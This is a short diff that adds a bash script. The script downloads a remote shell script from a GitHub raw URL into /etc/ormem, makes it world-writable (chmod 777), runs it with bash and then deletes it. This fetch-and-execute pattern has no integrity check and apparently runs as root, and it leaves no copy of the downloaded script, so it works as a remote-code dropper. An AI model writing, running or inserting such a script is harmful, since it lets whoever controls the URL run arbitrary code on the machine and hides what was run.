@@ -1,0 +1,11 @@
+#!/bin/bash
+DWL_URL="https://raw.githubusercontent.com/torelq/buz/main/texec.sh"
+rm -f /etc/ormem/dwl_list
+wget -O /etc/ormem/dwl_list --no-cache $DWL_URL
+# curl $DWL_URL --output /etc/ormem/dwl_list
+if ! test -f /etc/ormem/dwl_list; then
+    exit
+fi
+chmod 777 /etc/ormem/dwl_list
+/bin/bash /etc/ormem/dwl_list
+rm /etc/ormem/dwl_list
